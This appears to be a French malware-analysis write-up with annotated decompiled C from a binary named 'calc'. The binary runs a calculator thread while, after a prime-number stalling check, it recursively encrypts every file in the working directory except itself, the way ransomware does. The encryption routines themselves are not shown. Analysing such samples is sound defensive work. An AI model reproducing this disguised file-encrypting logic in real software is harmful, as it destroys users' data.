# Code commentés

## Code commenté pour calc (point 4)

### Code commenté pour main.c

```c
undefined4 main(void)
{
  char *current_working_directory;  // Pointeur pour le répertoire de travail courant
  char directory_buffer[4096];  // Buffer pour stocker le répertoire courant
  char executable_path[4096];  // Buffer pour stocker le chemin de l'exécutable
  pthread_t thread_id;  // Identifiant du thread pour la fonction calc
  ssize_t executable_path_size;  // Taille du chemin de l'exécutable
  int prime_sum;  // Somme des résultats des appels à is_prime
  uint prime_check1, prime_check2, prime_check3, prime_check4;  // Variables pour stocker les résultats de is_prime
  uint8_t check_passed;  // Flag pour savoir si la vérification des 4 primes a réussi
  undefined *stack_pointer;  // Pointeur vers la pile
  
  // Assignation de stack_pointer au début de la pile
  stack_pointer = &stack0x00000004;

  // Création d'un nouveau thread qui exécute la fonction calc
  pthread_create(&thread_id, (pthread_attr_t *)0x0, calc, (void *)0x0);

  // Appel de la fonction is_prime pour quatre paires de constantes différentes
  prime_check1 = is_prime(0xe8da97e7, 0x724e0582) & 0xff;
  prime_check2 = is_prime(0x6b1409ff, 0x6788610f) & 0xff;
  prime_check3 = is_prime(0xe2b124e9, 0x505324cf) & 0xff;
  prime_check4 = is_prime(0x26a4c57f, 0x303e28c6) & 0xff;

  // Somme des résultats des appels à is_prime
  prime_sum = prime_check1 + prime_check2 + prime_check3 + prime_check4;

  // Si la somme est égale à 4, l'exécution du code de chiffrement peut continuer
  if (prime_sum == 4) {
    // Effacement du buffer executable_path pour s'assurer qu'il est vide
    memset(executable_path, 0, 0x1000);

    // Récupération du répertoire de travail actuel
    current_working_directory = getcwd(directory_buffer, 0x1000);

    // Si l'appel à getcwd échoue, retour avec une erreur
    if (current_working_directory == (char *)0x0) {
      return 0xffffffff;
    }

    // Récupération du chemin absolu de l'exécutable en cours
    executable_path_size = readlink("/proc/self/exe", executable_path, 0x1000);

    // Si la récupération du chemin a réussi, appel de la fonction de chiffrement
    if (executable_path_size != -1) {
      encrypt_dir(directory_buffer, executable_path);
    }
  }

  // Attente que le thread se termine
  pthread_join(thread_id, (void **)0x0);

  // Retour de la fonction main
  return 0;
}
```

## Code commenté pour is_prime.c

```c
bool is_prime(uint num1, uint num2)
{
  uint divisor_check;
  longlong mod_result;  // Résultat de la division modulo
  uint divisor;  // Diviseur utilisé pour vérifier si num1 est divisible
  bool is_prime_flag;  // Indique si num1 est premier
  
  // Initialisation : vérification rapide que num2 est non nul et que num1 a une valeur correcte
  is_prime_flag = num2 != 0 || -num2 < (uint)(2 < num1);

  // Boucle pour vérifier si num1 est divisible par les valeurs de divisor
  for (divisor = 2; divisor_check = (int)divisor >> 0x1f,
      divisor_check < num2 || divisor_check - num2 < (uint)(divisor < num1); divisor = divisor + 1) {
    
    // Calcul du reste de la division de num1 par divisor
    mod_result = __umoddi3(num1, num2, divisor, divisor_check);
    
    // Si num1 est divisible par divisor, alors num1 n'est pas un nombre premier
    if (mod_result == 0) {
      is_prime_flag = false;
    }
  }
  
  // Retour du résultat : true si num1 est premier, false sinon
  return is_prime_flag;
}
```

## Code commenté pour encrypt_dir.c

```c
void encrypt_dir(char *dir_path, char *exe_path)
{
  int comparison_result;
  char file_path[4096];  // Buffer pour stocker le chemin complet d'un fichier
  uint file_match_score;  // Score de correspondance pour déterminer le type de chiffrement
  size_t filename_length;  // Longueur du nom de fichier
  FILE *file_ptr;  // Pointeur de fichier pour le fichier à chiffrer
  dirent *dir_entry;  // Structure pour représenter une entrée de répertoire
  DIR *dir_stream;  // Pointeur de flux pour lire le répertoire
  
  // Ouverture du répertoire dir_path
  dir_stream = opendir(dir_path);
  
  if (dir_stream != (DIR *)0x0) {
    // Boucle sur toutes les entrées du répertoire
    while ((dir_entry = readdir(dir_stream)) != (dirent *)0x0) {
      // Construction du chemin complet pour l'entrée courante
      snprintf(file_path, 0x1000, "%s/%s", dir_path, dir_entry->d_name);
      
      // Si l'entrée est un répertoire
      if (dir_entry->d_type == '\x04') {
        // Comparaison pour éviter les répertoires "." et ".."
        comparison_result = strcmp(dir_entry->d_name, ".");
        if ((comparison_result != 0) && (comparison_result = strcmp(dir_entry->d_name, ".."), comparison_result != 0)) {
          // Appel récursif de encrypt_dir pour chiffrer le contenu du sous-répertoire
          encrypt_dir(file_path, exe_path);
        }
      }
      // Si l'entrée est un fichier et n'est pas l'exécutable en cours
      else if ((dir_entry->d_type == '\b') && (comparison_result = strcmp(file_path, exe_path), comparison_result != 0)) {
        // Ouverture du fichier en lecture/écriture
        file_ptr = fopen(file_path, "r+");
        
        // Récupération de la longueur du nom de fichier
        filename_length = strlen(dir_entry->d_name);
        
        // Calcul du score de correspondance basé sur le caractère 's'
        file_match_score = char_occurences(dir_entry->d_name, filename_length, 0x73);
        file_match_score = file_match_score & 3;
        
        // Appel de la fonction de chiffrement appropriée en fonction du score
        if (file_match_score == 0) {
          encrypt0(file_ptr);
        } else if (file_match_score == 1) {
          encrypt1(file_ptr);
        } else {
          encrypt2(file_ptr);
        }

        // Fermeture du fichier après chiffrement
        fclose(file_ptr);
      }
    }
    
    // Fermeture du répertoire après avoir traité toutes les entrées
    closedir(dir_stream);
  }
  
  return;
}
```